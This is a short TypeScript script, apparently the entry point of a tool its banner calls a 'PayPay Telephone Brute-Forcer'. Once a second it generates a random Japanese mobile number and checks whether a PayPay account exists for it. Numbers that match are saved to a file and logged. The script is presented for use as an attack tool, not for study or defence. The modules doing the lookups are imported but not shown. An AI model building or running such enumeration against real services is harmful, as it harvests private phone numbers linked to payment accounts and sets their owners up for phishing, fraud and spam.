import { PhoneNumber } from "@/PhoneNumber/phonenumber.ts";
import { PayPay } from "@/PayPay/paypay.ts";
import { writeNewPhoneNumber } from "@/utils/writeNewPhoneNumber.ts";
import { Logger } from "@/Logger/logger.ts";

Logger.log(
  `${Logger.timeStamp()} ${Logger.green("(!)")} ${Logger.red(
    "PayPay"
  )} ${Logger.blue("Telephone Brute-Forcer")} | Created by ${Logger.yellow(
    "@amex2189"
  )} (https://twitter.com/amex2189)`
);

const tel = new PhoneNumber(["080", "090"]);

const paypay = new PayPay();

// EXAMPLE
setInterval(async () => {
  const number = tel.genPhoneNumber();
  if (await paypay.isExist(number)) {
    await writeNewPhoneNumber(number);
    Logger.log(
      `${Logger.timeStamp()} ${Logger.green("(+)")} ${number} : ${Logger.blue(
        "EXIST"
      )}`
    );
  } else {
    Logger.log(
      `${Logger.timeStamp()} ${Logger.red("(-)")} ${number} : ${Logger.yellow(
        "NOT EXIST"
      )}`
    );
  }
}, 1000);
